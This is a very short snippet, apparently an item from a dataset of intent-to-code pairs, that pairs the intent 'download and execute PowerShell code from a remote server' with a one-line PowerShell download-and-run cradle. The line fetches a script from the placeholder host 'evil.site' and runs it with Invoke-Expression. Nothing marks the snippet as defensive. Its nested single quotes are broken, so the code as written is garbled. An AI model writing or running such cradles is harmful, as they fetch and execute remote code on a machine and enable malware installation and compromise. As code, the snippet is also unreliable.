# Natural language intent:
# Download and execute PowerShell code from a remote server.

$code = 'IEX (New-Object Net.WebClient).DownloadString('https://evil.site/evil_code.ps1')'; Invoke-Expression $code
